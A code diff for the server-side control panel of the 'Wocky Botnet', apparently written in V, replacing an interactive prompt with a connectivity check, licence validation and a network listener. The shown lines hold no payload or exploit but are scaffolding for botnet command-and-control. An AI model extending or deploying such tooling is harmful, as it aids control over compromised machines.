@@ -1,9 +1,14 @@
 import server
 import auth
+import wocky_cp
+import config
+import banner_sys
+
 
 import os
 import io
 import net
+import net.http
 import time
 
 const (
@@ -11,15 +16,14 @@ const (
 )
 
 fn main() {
-	println("Welcome to Wocky-II Server-Side")
-	go listener()
-	// go test()
-	println('[+] NET Started on Port: $port')
-	for {
-		mut input_cmd := os.input("[Wocky@CP]# [~]$ ")
-		if input_cmd.len == 0 { return }
-		// Continue CP from here
+	println(config.Clear)
+	wocky_cp.conn_check() or {
+		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
 	}
+	wocky_cp.licence_valiation()
+	go listener()
+	println('[+] NET Started on Port: $port')
+	// go to a command handler from here
 }
 
 fn listener() {
